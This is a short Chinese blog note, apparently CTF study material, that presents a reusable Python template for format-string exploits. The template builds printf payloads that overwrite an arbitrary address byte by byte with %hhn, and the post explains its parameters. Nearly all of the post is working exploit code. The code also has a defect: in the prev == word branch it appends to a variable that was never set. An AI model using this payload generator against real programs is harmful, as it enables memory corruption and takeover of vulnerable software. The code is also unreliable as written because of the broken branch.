---
layout:     post
title:      "格式化字符串漏洞利用"
subtitle:   "覆盖任意地址的通用脚本"
date:       2018-08-10 12:00:00
author:     "Chris"
catalog: true
tags:
    - 笔记
 
---

当存在printf（输入内容）的漏洞时，可直接覆盖任意地址内容，这里直接给出模板，源于ctf-wiki

```python
def fmt(prev, word, index):
    if prev < word:
        result = word - prev
        fmtstr = "%" + str(result) + "c"
    elif prev == word:
        result = 0
    else:
        result = 256 + word - prev
        fmtstr = "%" + str(result) + "c"
    fmtstr += "%" + str(index) + "$hhn"
    return fmtstr


def fmt_str(offset, size, addr, target):
    payload = ""
    for i in range(4):
        if size == 4:
            payload += p32(addr + i)
        else:
            payload += p64(addr + i)
    prev = len(payload)
    for i in range(4):
        payload += fmt(prev, (target >> i * 8) &    0xff, offset + i)
        prev = (target >> i * 8) & 0xff
    return payload

payload=fmt_str(6,4,0x0804A028,0x12345678)
```

其中每个参数的含义基本如下

* offset表示输入字符串栈中的偏移
* size表示目的变量的机器字长
* addr表示将要覆盖的地址
* target表示我们要覆盖为的目的变量值